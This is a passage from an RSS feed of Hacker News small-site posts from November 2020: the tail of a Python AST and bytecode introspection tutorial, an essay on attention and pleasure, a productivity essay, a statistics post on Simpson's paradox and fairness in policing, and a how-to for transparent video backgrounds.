We’ll check <code>targets</code> first:</p>

<div title="" tabindex="0"><div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>tree</span><span>.</span><span>body</span><span>[</span><span>0</span><span>]</span><span>.</span><span>targets</span><span>[</span><span>0</span><span>]</span><span>.</span><span>id</span>
<span>'x'</span></code></pre></div></div>


<p>Just as we expected. Now let’s look at <code>value</code>:</p>

<div title="" tabindex="0"><div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>tree</span><span>.</span><span>body</span><span>[</span><span>0</span><span>]</span><span>.</span><span>value</span>
<span>&lt;</span><span>_ast</span><span>.</span><span>BinOp</span> <span>object</span> <span>at</span> <span>0x1014e3128</span><span>&gt;</span></code></pre></div></div>


<p>It’s a <code>BinOp</code> object - a binary operator, meaning an operator that takes two arguments. That must be our <code>+</code> operator!
We run <code>dir</code> again to see what it does, and it looks like we want to see the <code>op</code> attribute:</p>

<div title="" tabindex="0"><div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>tree</span><span>.</span><span>body</span><span>[</span><span>0</span><span>]</span><span>.</span><span>value</span><span>.</span><span>op</span>
<span>&lt;</span><span>_ast</span><span>.</span><span>Add</span> <span>object</span> <span>at</span> <span>0x1014d3978</span><span>&gt;</span></code></pre></div></div>


<p>Yep, just as we expected - <code>Add</code> is clearly the token representing the <code>+</code> operator. Where are the <code>4</code> and <code>8</code>? They’re
in the <code>BinOp</code>, which has <code>left</code> and <code>right</code> attributes:</p>

<div title="" tabindex="0"><div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>tree</span><span>.</span><span>body</span><span>[</span><span>0</span><span>]</span><span>.</span><span>value</span><span>.</span><span>left</span><span>.</span><span>n</span>
<span>4</span>
<span>&gt;&gt;&gt;</span> <span>tree</span><span>.</span><span>body</span><span>[</span><span>0</span><span>]</span><span>.</span><span>value</span><span>.</span><span>right</span><span>.</span><span>n</span>
<span>8</span></code></pre></div></div>


<p>So we have the entire AST we sketched out before, represented by Python objects in a nested structure that reflects the structure of the tree!</p>


<div>
    <figure><img src="https://anvil.works/blog/img/introspection-in-python/ast-diagram-code.png" alt="How ast expresses x = 4 + 8"> <figcaption>
                <p>How <code>ast</code> expresses <code>x = 4 + 8</code></p>
            </figcaption>
    </figure>
</div>

<h3 id="how-python-executes-code">How Python executes code</h3>

<p>So Python turns the characters that make up our code into an AST representing the <em>meaning</em> of the code, and it gives
us the <code>ast</code> module to inspect that for ourselves. But there’s more to executing the code than this. The standard
Python implementation (<a href="https://github.com/python/cpython">CPython</a>) compiles your lovingly hand-crafted Python
code into a form of assembly language - Python Bytecode - that runs on a virtual machine. This is how Python
can ‘write once, run anywhere’. The virtual machine is compiled for various different types of computer, and the
bytecode that runs on it is completely universal.</p>

<p>Just as with <code>ast</code>, Python has a standard library module called <code>dis</code> that can show you the bytecode generated
from a given Python program. You can pass in a Python object such as a function, or you can pass in a Python program as a string:</p>

<div title="" tabindex="0"><div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>from</span> <span>dis</span> <span>import</span> <span>dis</span>
<span>&gt;&gt;&gt;</span> <span>dis</span><span>(</span><span>'x = 4 + 8'</span><span>)</span>
  <span>1</span>           <span>0</span> <span>LOAD_CONST</span>               <span>0</span> <span>(</span><span>12</span><span>)</span>
              <span>2</span> <span>STORE_NAME</span>               <span>0</span> <span>(</span><span>x</span><span>)</span>
              <span>4</span> <span>LOAD_CONST</span>               <span>1</span> <span>(</span><span>None</span><span>)</span>
              <span>6</span> <span>RETURN_VALUE</span></code></pre></div></div>


<p>Since this is an extremely simple Python program, it’s not hard to understand the bytecode. The first line
loads a constant onto the Python virtual machine’s memory stack:</p>




<p>The value of that constant is included in the actual
bytecode, and there’s a little optimisation here. The addition has already been carried out! The compiler has
converted the <code>4 + 8</code> into <code>12</code> so the VM doesn’t need to do that at runtime.</p>

<p>The next instruction is our assignment operator (the <code>=</code>). It instructs the VM to define a symbol <code>x</code> and store
the value at position <code>0</code> in it. This means it can refer to <code>x</code> later on in the code:</p>




<p>The compiler appears to be a little stupid here. Doesn’t it realise that this is the end of the code, and there is no ‘later on’?
In fact, our tiny program <code>x = 4 + 8</code> is a Python <em>module</em>, so the bytecode keeps track of the label <code>x</code> in case any other modules want to import it.</p>

<p>There are two more instructions that we might not have expected to see. First, <code>None</code> is loaded onto the stack. Next,
the <code>RETURN_VALUE</code> instruction is called.</p>

<div title="" tabindex="0"><div><pre><code data-lang="python">              <span>4</span> <span>LOAD_CONST</span>               <span>1</span> <span>(</span><span>None</span><span>)</span>
              <span>6</span> <span>RETURN_VALUE</span></code></pre></div></div>


<p>We didn’t tell it to return <code>None</code>!? But all Python functions and modules …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://anvil.works/blog/introspection-in-python">https://anvil.works/blog/introspection-in-python</a></em></p>]]>
            </description>
            <link>https://anvil.works/blog/introspection-in-python</link>
            <guid isPermaLink="false">hacker-news-small-sites-25186960</guid>
            <pubDate>Mon, 23 Nov 2020 14:18:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An intuitive introduction to systemic thinking]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25186909">thread link</a>) | @hkhn
<br/>
November 23, 2020 | http://www.knowledgefederation.org/Intuitive_introduction_to_systemic_thinking | <a href="https://web.archive.org/web/*/http://www.knowledgefederation.org/Intuitive_introduction_to_systemic_thinking">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="contentwrapper">

			
			<div>
				<div role="main">
							<div id="content">
			
									
									<!-- bodyContent -->
			<div id="bodyContent">
								<p>From Knowledge Federation</p>
								
												
				<div id="mw-content-text" lang="en" dir="ltr">
<div>
<p><h2><span id="Attention_is_a_resource"></span>Attention is a resource</h2></p>
<div><h3><span id="What_a_giant_had_to_say"></span>What a giant had to say</h3>
<p>A long long time ago, when the teachers were still in custody of young people's character, here is what <a href="http://www.knowledgefederation.org/index.php?title=William_James&amp;action=edit&amp;redlink=1" title="William James (page does not exist)">William James</a> had to tell them about this matter:
</p><blockquote>
<p>In what does a moral act consist? It consists in the effort of attention by which we hold fast to an idea which but for that effort of attention would be driven out of the mind by the other psychological tendencies that are there. To think, in short, is the secret of will, just as it is the secret of memory.
</p>
</blockquote>
<h3><span id="Attention_has_a_purpose"></span>Attention has a purpose</h3>
<p>Attention, and the emotion of interest which naturally directs it, are there for a purpose. Interest is what might move young people to explore and understand the world. And to exercise their minds and bodies.</p>
</div>

</div>
<div>

<div>
<p>But our industries have been able to separate this emotion from its purposes. They created games that engage only "other psychological tendencies", so that the effort of attention that sustains a moral act is never experienced; which keep children's attention <em>away</em> from reality; which exercise no more than their thumbs and their rear ends; whose ethical message is that killing is fun; and which are so "immersive" that they make everything else – and school in particular – seem dull in comparison.</p>
<p>What will prevent our young ones from virtually <em>living</em> in the virtual world? Where success is so much easier to experience; and even the <em>ultimate</em> failure can be reversed by pressing the restart button!</p>
<h3><span id="It.27s_a_complex_world"></span>It's a complex world</h3>
<p><em>For all we know</em>, we may have created a complex and dangerous world, which will demand of our next generation the presence of spirit that we ourselves haven't been able to muster.</p>
<p>We say "for all we know", because we <em>don't</em> really know. While some of our colleagues have done research and concluded that our civilization may just barely make it, provided we make changes promptly, the rest of us continue to live and work just as we did before. Notice that we are not saying that our civilization is in trouble; others have said that. All <em>we</em> need in order to motivate our initiative follows from what we've just said. And it's anyhow obvious – it's that <em>we do not know</em> what our situation is and what we need to do; because <em>the way in which we handle knowledge is keeping us from knowing</em>.</p>
<p>And because also <em>our</em> attention has been mishandled.</p>
<h3><span id="The_economy_of_attention"></span>The economy of attention</h3>
<p>The journalists are not to be blamed. They are just trying to make ends meet in a competitive world.</p>
<p>Our friends who innovate in journalism told us that there's just about one business model left to the journalists, as a way to compete with abundant free information. They call it "attention economy", but it's not what you might think. The journalists are not economizing with our attention as a resource, by directing it where it is most needed. On the contrary – the attention economy means attracting people's attention <em>by whatever means may still be available</em>, and selling it – as a commodity, measured as the number of thousands of readers or viewers – to the advertisers.</p>
<p>And we don't need to tell you that it's those advertisers – that half-a-trillion-dollars-a-year global industry that combines state-of-the-art science with state-of-the-art communication design – that are now in charge of <em>everyone's</em> character! If they do their job right, then "the effort of attention by which we hold fast to an idea" ("do I really need this?") will yield to "the other psychological tendencies that are there" ("this looks attractive – let's have it!"). But don't blame the advertisers; this just happens to be <em>their</em> way to make a living in a competitive world.</p></div>
</div>
<hr>
<div>
<p><h2><span id="Pleasure_is_a_resource"></span>Pleasure is a resource</h2></p>
<div><h3><span id="Pleasure_has_a_purpose"></span>Pleasure has a purpose</h3>
<p>Neither the parents are to be blamed.</p>
<p>We parents, of course, only wish our children our best. We want them to be happy! The trouble is that we believe (because we've been <em>socialized</em> to believe) that happiness means doing what feels attractive at the moment. How can we deny our children those games, when they might be the <em>only</em> thing that still interests them?</p>
<p>The sensation that something is attractive or pleasant too has a role in the larger scheme of things. It's what the nature created to make us do what is good for us. But our industries have been able to separate that too from its purpose! Think, in the manner of a metaphor, about white sugar: the pleasurable substance has been extracted from the nutritious rest. We can now fool nature; we can add sugar (physically, and metaphorically) to virtually anything. We can make <em>anything</em> taste attractive!</p>
<p>But there's a hidden cost. (<em>Two</em> hidden costs, to be exact. We let you discover the other one on your own.)</p>
</div>
</div>
<div>

<div>
<h3><span id="The_economy_of_pleasure"></span>The economy of pleasure</h3>
<p>Around the time when William James was writing the above lines, Friedrich Nietzsche was looking at the course modernity was taking and jotting down notes:</p>
<blockquote><p>Sensibility immensely more irritable; the abundance of disparate impressions greater than ever; cosmopolitanism in food, literatures, newspapers, forms, tastes, even landscapes. The tempo of this influx prestissimo; the impressions erase each other; one instinctively resists taking in anything, taking anything deeply, to “digest” anything; a weakening of the power to digest results from this. A kind of adaptation to this flood of impressions takes place: men unlearn spontaneous action, they merely react to stimuli from outside. They spend their strength partly in assimilating things, partly in defense, partly in opposition. Profound weakening of spontaneity: The historian, critic, analyst, interpreter, the observer, the collector, the reader-all of them reactive talents-all science!</p>
<p>Artificial change of one’s nature into a “mirror”; interested but, as it were, merely epidermically interested; a coolness on principle, a balance, a fixed low temperature closely underneath the thin surface on which warmth, movement, “tempest,” and the play of waves are encountered.“</p>
<p>Opposition of external mobility and a certain deep heaviness and weariness.“</p></blockquote>
</div>

</div>
<div>

<div>
<p>Interesting to observe that this was written before the radio, the TV, the worldwide travel, the computer and the mobile phone.</p>
<p>Imagine if this is really true! Imagine if we've been "pursuing happiness" by seeking stimulation – and sacrificing our very <em>ability</em> to feel!</p>
<p>We think about Nietzsche when we hear some of the music that young people listen to. It reminded us of doleful howls of some youngsters whose subtlety of feeling has been lost – created in an ardent effort to stimulate the overstimulated senses of their brethren <em>even</em> a bit further.</p>
</div>
</div>
<hr>
<div>
<p><h2><span id="Knowledge_too_is_a_resource"></span>Knowledge too is a resource</h2></p>
<div><h3><span id="We.27ve_done_one_thing_right"></span>We've done one thing right</h3>
<p>In the midst of all systemic mishaps, one thing has been done right – the academic tenure. And the corresponding ethos of academic freedom.</p>
<p>We now have a global army, of people who have been selected and specially educated and publicly sponsored to think deeply and freely. Its task is to protect us from ignorance; to create  knowledge of highest standards, and make sure it prevails.</p>
<p>Is this army still trained and organized as it might empower it to fulfill its vitally important task – <em>in this age</em>? </p> 
<p>Max Weber – a <a href="http://www.knowledgefederation.org/index.php?title=Giants&amp;action=edit&amp;redlink=1" title="Giants (page does not exist)"><em>giant</em></a> of sociology – observed that the greatest progress in the art of warfare resulted from improvements in the social organization of warriors. Could it be similar also in our strife with ignorance?</p></div>
</div>

<!-- 
NewPP limit report
Cached time: 20201126172208
Cache expiry: 86400
Dynamic content: false
CPU time usage: 0.040 seconds
Real time usage: 0.045 seconds
Preprocessor visited node count: 22/1000000
Preprocessor generated node count: 46/1000000
Post‐expand include size: 0/2097152 bytes
Template argument size: 0/2097152 bytes
Highest expansion depth: 1/40
Expensive parser function count: 0/100
-->

<!-- 
Transclusion expansion time report (%,ms,calls,template)
100.00%    0.000      1 - -total
-->

<!-- Saved in parser cache with key mw_kf:pcache:idhash:118-0!*!0!!en!5!* and timestamp 20201126172207 and revision id 4958
 -->
</div>								
																								
							</div>
			<!-- /bodyContent -->
		</div>
					</div>
			</div>
		</div></div>]]>
            </description>
            <link>http://www.knowledgefederation.org/Intuitive_introduction_to_systemic_thinking</link>
            <guid isPermaLink="false">hacker-news-small-sites-25186909</guid>
            <pubDate>Mon, 23 Nov 2020 14:12:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Productivity Advice]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25186897">thread link</a>) | @shubhamjain
<br/>
November 23, 2020 | https://www.spakhm.com/p/productivity-advice | <a href="https://web.archive.org/web/*/https://www.spakhm.com/p/productivity-advice">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Do the work.</p><p>That's all the productivity advice you need, and the only <em>useful</em> productivity advice you're ever going to get. You can direct your attention to a million optimizations— email, meetings, notes, calendar, time tracking, goals, todo lists, time estimates, prioritization frameworks, quantified self sensors, analytics, apps, documents, journaling. But don't. Ignore all this, and do the work. When you do the work, everything else optimizes itself.</p><p>If the only thing you must do is the work, why is there so much productivity advice? Blog posts, courses, seminars, software? Because when there is demand, there is supply. Work is hard. People will latch onto anything to avoid doing it. The market is happy to oblige.</p><p>Work means sitting down, getting through that calculus chapter, and doing the exercises. No amount of productivity hacking will make that easier. You don't need pomodoro alarms, bullet journals, time tracking apps, animated explainer videos, or different color highlighters. Everyone doesn't learn differently. Everyone learns calculus in the same way— by doing the work. You need Rudin's book, a pen, paper, and time. More tools give you negative utility. They won't make the work go faster. But they will consume as much time as you are willing to waste.</p><p>Building a new startup? Same thing. Talk to users all day. Then sit down and write the code. Get others to join you. Repeat. People do new founders a disservice by constantly proselytizing how complex startups are. In one sense they are. But in another sense they're surprisingly simple. For a long time you're doing the same three things over and over. Sell. Code. Recruit. Then do it all over again tomorrow. Startups don't get built by watching startup advice videos on YouTube. They get built by doing the work. All you need is a laptop and a metrocard.</p><p>I read a lot of biographies. People who have biographies written about them have two things in common. First, they are obsessed. Second, they never stray from doing the work. John Carmack was obsessed with game engines. Orville and Wilbur Wright were obsessed with manned flight. Leonardo da Vinci was obsessed with the structure of things. So they would code, construct, and paint. That's not to say they did no meta thinking. Carmack published plan files, the Wright brothers maintained extensive correspondence detailing their experiments, and Leonardo da Vinci is known for his magnificent notebooks. But you'd be hard pressed to find them writing letters about writing letters. They were busy doing the work.</p><p>An important ingredient for doing the work is boredom. That's how I got into programming. School was boring. We had three channels of television, and they were almost always boring. I had computer games, but I sucked at gaming and games quickly got frustrating. I read all the books that we had laying around. The only thing left was BASIC. So I started there and never stopped. The simple reason is that programming computers was the most interesting activity around.</p><p>If boredom is a necessary ingredient, then portable internet is a disaster for doing the work. How are you supposed to get excited about anything if you're never bored? I don't know if I ever would have learned to program if I had modern internet. Why would I, if something more interesting was always a click away? This is true to this day. I can't get anything done when I'm online. There is always something on the internet that's locally more interesting or more important than writing the next paragraph, or threading a flag through a series of function calls, or reading a book. The only way I can get anything done is to turn the internet off.</p><p>So I do. I have a work computer, and a router with parental controls that blocks every possible internet distraction on it. No Twitter, no Hacker News, no YouTube. Router administration is set up so I can't make changes over WiFi. If I want to unblock something, I have to physically get to the router and plug in a cable to change the settings. I power off every other device. No silent mode, no do not disturb, no hibernation. Power off. Recently a reader suggested putting my phone in a <a href="https://amzn.to/3fmBx4n">kSafe</a> (thanks Robert!) It works great, and now I’m doing that too. All this constructs enough physical barriers between me and temptation that the internet loses and my laziness wins.</p><p>Then I get properly bored. And then I do the work.</p></div></div>]]>
            </description>
            <link>https://www.spakhm.com/p/productivity-advice</link>
            <guid isPermaLink="false">hacker-news-small-sites-25186897</guid>
            <pubDate>Mon, 23 Nov 2020 14:11:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why fairness is basically unobservable]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25186782">thread link</a>) | @dyno-might
<br/>
November 23, 2020 | https://dyno-might.github.io/2020/11/23/police-violence-why-fairness-is-basically-unobservable/ | <a href="https://web.archive.org/web/*/https://dyno-might.github.io/2020/11/23/police-violence-why-fairness-is-basically-unobservable/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <div>
        







<div>
    <div>
        <div>
            
            <p><strong>Nov 23, 2020</strong></p>
            
            <p>We want to know if things are fair. Do some groups of people tend to get a raw deal in company hiring or university admissions or court sentences?</p>

<p>There <em>seems</em> to be an obvious way to answer such questions: Get some data and “check” for bias. But different people often get different results, even when looking at the same data. What’s going on?</p>

<p>What’s going on is the whole strategy is <a href="https://dyno-might.github.io/2020/11/16/simpsons-paradox-and-the-tyranny-of-strata/">doomed</a>. It’s counterintuitive, but you usually <em>can’t</em> determine bias this way. The problem boils down to that in order to “check” for bias you must do something to your data called <em>stratification</em>. This can totally change the results, and there’s no single best way to do it.</p>



<p>Let’s do a thought experiment. You live in a city inhabited by blue people and red people. There are constant debates about if police are biased against either of these groups. Eventually, you decide to take action. You find 1024 blue men and 1024 red men, give each a suspicious looking stack of $20 bills and tell them to jog outside for an hour while holding the stack. Finally, you count the number that are arrested in each group.  (You have a <em>very</em> good relationship with your local <a href="https://en.wikipedia.org/wiki/Institutional_review_board">IRB</a>.)</p>



<p>So you run the experiment, and these are the results:</p>

<table>
  <thead>
    <tr>
      <th>blue total</th>
      <th>red total</th>
      <th>blue arrested</th>
      <th>red arrested</th>
      <th>% blue arrested</th>
      <th>% red arrested</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1024</td>
      <td>1024</td>
      <td>232</td>
      <td>280</td>
      <td>22.7</td>
      <td>27.3</td>
    </tr>
  </tbody>
</table>

<p>More reds were arrested than blues. Does this show police bias against reds?</p>



<p>You show your data to a friend. She notices that the blue men in your population were more often old (over 35) while the red men were more often young (35 or less). In particular, your data has these demographics:</p>

<table>
  <thead>
    <tr>
      <th>age</th>
      <th>blue total</th>
      <th>red total</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>old</td>
      <td>640</td>
      <td>384</td>
    </tr>
    <tr>
      <td>young</td>
      <td>384</td>
      <td>640</td>
    </tr>
  </tbody>
</table>

<p>She re-does your analysis separately for young and old men. The results are as follows:</p>

<table>
  <thead>
    <tr>
      <th>age</th>
      <th>blue total</th>
      <th>red total</th>
      <th>blue arrested</th>
      <th>red arrested</th>
      <th>% blue arrested</th>
      <th>% red arrested</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>old</td>
      <td>640</td>
      <td>384</td>
      <td>84</td>
      <td>44</td>
      <td>13.1</td>
      <td>11.5</td>
    </tr>
    <tr>
      <td>young</td>
      <td>384</td>
      <td>640</td>
      <td>148</td>
      <td>236</td>
      <td>38.5</td>
      <td>36.9</td>
    </tr>
  </tbody>
</table>

<p>Now this suggests a bias against <em>blue</em> men. The police arrest young blue men more often than young red men, and similarly for the old. The reason the previous analysis suggested a bias against red men is that more of them are young.</p>

<p>Does this now show that the police are biased against blues?</p>



<p>Your friend pokes at the data some more. She points out that reds are more likely to live in Riverview, while blues are more likely to live in Pineway. Specifically, you have these demographics:</p>

<table>
  <thead>
    <tr>
      <th>neighborhood</th>
      <th>age</th>
      <th>blue total</th>
      <th>red total</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Pineway</td>
      <td>old</td>
      <td>384</td>
      <td>128</td>
    </tr>
    <tr>
      <td>Pineway</td>
      <td>young</td>
      <td>256</td>
      <td>256</td>
    </tr>
    <tr>
      <td>Riverview</td>
      <td>old</td>
      <td>256</td>
      <td>256</td>
    </tr>
    <tr>
      <td>Riverview</td>
      <td>young</td>
      <td>128</td>
      <td>384</td>
    </tr>
  </tbody>
</table>

<p>She re-does the analysis for each location / age group. These are the results:</p>

<table>
  <thead>
    <tr>
      <th>neighborhood</th>
      <th>age</th>
      <th>blue total</th>
      <th>red total</th>
      <th>blue arrested</th>
      <th>red arrested</th>
      <th>% blue arrested</th>
      <th>% red arrested</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Pineway</td>
      <td>old</td>
      <td>384</td>
      <td>128</td>
      <td>70</td>
      <td>26</td>
      <td>18.2</td>
      <td>20.3</td>
    </tr>
    <tr>
      <td>Pineway</td>
      <td>young</td>
      <td>256</td>
      <td>256</td>
      <td>110</td>
      <td>114</td>
      <td>43.0</td>
      <td>44.5</td>
    </tr>
    <tr>
      <td>Riverview</td>
      <td>old</td>
      <td>256</td>
      <td>256</td>
      <td>14</td>
      <td>18</td>
      <td>5.5</td>
      <td>7.0</td>
    </tr>
    <tr>
      <td>Riverview</td>
      <td>young</td>
      <td>128</td>
      <td>384</td>
      <td>38</td>
      <td>122</td>
      <td>29.7</td>
      <td>31.8</td>
    </tr>
  </tbody>
</table>

<p>In each age-location group, reds were more often arrested than blues. The difference from the previous analysis is that blues tend to live in Pineway, and police more often arrest people in Pineway.</p>

<p>This suggests a bias against reds. But, given how things have changed in the past, something feels off…</p>



<p>Sweating, you ask your friend, “<em>Now</em> are we done?”</p>

<p>She says, “Almost! I just noticed that clothing seems to be a factor! Reds tend to wear joggers while blues tend to wear shorts. Just give me a second…”</p>

<p>She re-does the analysis yet again, with the following results.</p>

<table>
  <thead>
    <tr>
      <th>attire</th>
      <th>neighborhood</th>
      <th>age</th>
      <th>blue total</th>
      <th>red total</th>
      <th>blue arrested</th>
      <th>red arrested</th>
      <th>% blue arrested</th>
      <th>% red arrested</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>shorts</td>
      <td>Pineway</td>
      <td>old</td>
      <td>224</td>
      <td>32</td>
      <td>35</td>
      <td>5</td>
      <td>15.6</td>
      <td>15.6</td>
    </tr>
    <tr>
      <td>shorts</td>
      <td>Pineway</td>
      <td>young</td>
      <td>160</td>
      <td>96</td>
      <td>65</td>
      <td>39</td>
      <td>40.6</td>
      <td>40.6</td>
    </tr>
    <tr>
      <td>shorts</td>
      <td>Riverview</td>
      <td>old</td>
      <td>160</td>
      <td>96</td>
      <td>5</td>
      <td>3</td>
      <td>3.1</td>
      <td>3.1</td>
    </tr>
    <tr>
      <td>shorts</td>
      <td>Riverview</td>
      <td>young</td>
      <td>96</td>
      <td>160</td>
      <td>27</td>
      <td>45</td>
      <td>28.1</td>
      <td>28.1</td>
    </tr>
    <tr>
      <td>joggers</td>
      <td>Pineway</td>
      <td>old</td>
      <td>160</td>
      <td>96</td>
      <td>35</td>
      <td>21</td>
      <td>21.9</td>
      <td>21.9</td>
    </tr>
    <tr>
      <td>joggers</td>
      <td>Pineway</td>
      <td>young</td>
      <td>96</td>
      <td>160</td>
      <td>45</td>
      <td>75</td>
      <td>46.9</td>
      <td>46.9</td>
    </tr>
    <tr>
      <td>joggers</td>
      <td>Riverview</td>
      <td>old</td>
      <td>96</td>
      <td>160</td>
      <td>9</td>
      <td>15</td>
      <td>9.4</td>
      <td>9.4</td>
    </tr>
    <tr>
      <td>joggers</td>
      <td>Riverview</td>
      <td>young</td>
      <td>32</td>
      <td>224</td>
      <td>11</td>
      <td>77</td>
      <td>34.4</td>
      <td>34.4</td>
    </tr>
  </tbody>
</table>

<p>Now, the percentages are exactly the same in each group. The police tend to arrest young men in Pineway wearing joggers. They tend not to arrest old men in Riverview wearing shorts. All the racial differences you saw before might be due to correlations between race and age, neighborhood, and attire, not because of race <em>itself</em>.</p>



<p>You tell your friend “Well done! You’ve resolved it. It’s getting late, I think I’ll be going…”</p>

<p>As you edge towards the door she says “Yeah, goodnight, let’s do this again! But before you leave, I did notice that some people wear headphones and some don’t…”</p>

<p>If you’re familiar with Simpson’s paradox, this is all basically an example of a <a href="https://dyno-might.github.io/2020/11/16/simpsons-paradox-and-the-tyranny-of-strata/">“recursive” Simpson’s paradox</a>.</p>



<p>What went “wrong” in this experiment? Suppose you gather data on police interactions with people of a single race. No one would be surprised if the statistics are different with respect to the young vs. old or urban vs. rural or rich vs. poor or churchgoers vs. nonreligious. It would be surprising if there <em>weren’t</em> differences.</p>

<p>Let’s say you want to use observational data to prove police are biased against red people. To do this, you need to split up all red and blue people into subgroups (“strata”) in such a way that each subgroup of red people is “exactly the same” as the corresponding subgroup, except for their race.</p>

<p>This is basically an impossible task. Human beings are complicated and multidimensional. To a first approximation, <a href="https://dyno-might.github.io/2020/10/08/police-violence-your-ratios-dont-prove-what-you-think-they-prove/">race is correlated with everything</a>. There’s just too many attributes to firmly establish that <em>any</em> observed difference is really due to race and not to something else that’s correlated with race. However much you try to split people up, there will still be remaining differences between each “red group” and each “blue group” you haven’t accounted for. For the same reason, you can’t use observational data to prove there <em>isn’t</em> bias.</p>

<p>If you want to measure fairness, you need to <em>intervene</em>. We’ll discuss that more next time.</p>

<hr>

<p>This post is part of a series on bias in policing with more still to come.</p>
<ul>
  <li>Part 1: <a href="https://dyno-might.github.io/2020/10/08/police-violence-your-ratios-dont-prove-what-you-think-they-prove/#a-thought-experiment">Your ratios don’t prove what you think they prove</a></li>
  <li>Part 2: <a href="https://dyno-might.github.io/2020/10/12/police-violence-the-veil-of-darkness/">The veil of darkness</a></li>
  <li>Part 3: <a href="https://dyno-might.github.io/2020/11/21/police-violence-policy-proposals-and-what-we-dont-know-about-them/">Policy proposals and what we don’t know about them</a></li>
  <li>Part 4: <strong>Why fairness is basically unobservable (This post)</strong></li>
</ul>


        </div>

        

        
        
    </div>
</div>


    </div>
</section></div>]]>
            </description>
            <link>https://dyno-might.github.io/2020/11/23/police-violence-why-fairness-is-basically-unobservable/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25186782</guid>
            <pubDate>Mon, 23 Nov 2020 13:57:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Replace any color or object from a video with a transparent background]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25186460">thread link</a>) | @011-video
<br/>
November 23, 2020 | https://011.video/2020/11/22/replace-any-object-from-a-video-by-a-transparent-background/ | <a href="https://web.archive.org/web/*/https://011.video/2020/11/22/replace-any-object-from-a-video-by-a-transparent-background/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-2988">
	
	

	

	<div>
		<p><iframe title="Replace any object from a video with transparent background" width="576" height="324" src="https://www.youtube.com/embed/Lg1ZqY_TN2s?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<h2><em><strong>How to replace any object from a video by a transparent background?</strong></em></h2>
<ol>
<li>
<h6>Upload&nbsp;&nbsp;<img src="https://011.video/images/uploadV2.png" alt=""> the video that you want to make transparent background.</h6>
</li>
<li>
<h6><span>For a short video RIGHT-CLICK ON THE VIDEO CONTROL </span><img loading="lazy" src="https://011.video/images/loop-control.png" alt="" width="131" height="50"> &nbsp;<span>AND&nbsp; SET THE LOOP attribute ON.</span></h6>
</li>
<li>
<h6><span>Play the video. </span></h6>
</li>
<li>
<h6>When you are ready to remove the green screen click on visual-effects button <img loading="lazy" src="https://011.video/wp-content/uploads/2019/09/effet.png" alt="011.video special effect" width="35" height="35"></h6>
</li>
<li>
<h6>Click on the magic wand (Alpha Channel) button&nbsp; <img src="https://011.video/images/baguette.png" alt="blur the video"></h6>
</li>
<li>
<h6>Click INSIDE CANVAS on the green screen background.</h6>
</li>
<li>
<h6>Continue to click until the color is replaced by a transparent background. You should see a removal counter display inside the message box.</h6>
</li>
<li>
<h6>If you’ve clicked too far click on the cancel button <img src="https://011.video/images/back.png" alt="">&nbsp; to step back.</h6>
</li>
<li>
<h6>&nbsp;Play the video again <img loading="lazy" src="https://011.video/wp-content/uploads/2019/10/end-video.png" alt="end the video play" width="107" height="40"></h6>
</li>
<li>
<h6>Check if all the selected color is gone.</h6>
</li>
<li>
<h6>Click on the scissor hand button&nbsp; <img src="https://011.video/images/cut.png" alt="scissor and button"></h6>
</li>
<li>
<h6>Click once and hold the mouse button 🖱Down to select the object to cut with the pair of scissors.</h6>
</li>
<li>
<h6>Click once again and release the mouse button 🖱to remove the object selected.</h6>
</li>
<li>
<h6>Play the video again, check if the selected object is gone. Set the loop <span>attribute </span>off.</h6>
</li>
<li>
<h6>Record the video with the new transparent background&nbsp; <img src="https://011.video/images/on2.png" alt=""></h6>
</li>
<li>
<h6>Download your video <img src="https://011.video/images/d2.png" alt=""></h6>
</li>
<li>
<h6>You will find 011.video.WebM file in your download directory. Contrary to The <b>MP4</b> format who <b>doesn’t support</b>&nbsp;an&nbsp;<b>Alpha channel, </b>WebM video container format does. By the way WebM&nbsp; is the best format to play a transparent video over a web page. Here is a sample of a “<a href="https://011.video/green-screen/basket-ball-transparent-video-overlay-web-page.html" target="_blank" rel="noopener noreferrer">transparent video overlaid a web page’ </a></h6>
</li>
<li>
<h6>You can apply the same transparency process with a webcam stream&nbsp; <img src="https://011.video/images/camon.png"> &nbsp;<span> Just </span>Make sure to select a full canvas display and to have a strong color contrast between you and the background behind.</h6>
</li>
</ol>
<h6><span>Try 011.video right now&nbsp; <a href="https://011.video/desktop.html"><img loading="lazy" title="011.video on Desktop" src="https://011.video/wp-content/uploads/2020/03/desktop.png" alt="" width="40" height="40"></a></span></h6>
<!-- Rate my Post Plugin -->				<ul>	<li><a lang="en-US" hreflang="en-US" href="https://011.video/2020/11/22/replace-any-object-from-a-video-by-a-transparent-background/">English</a></li>
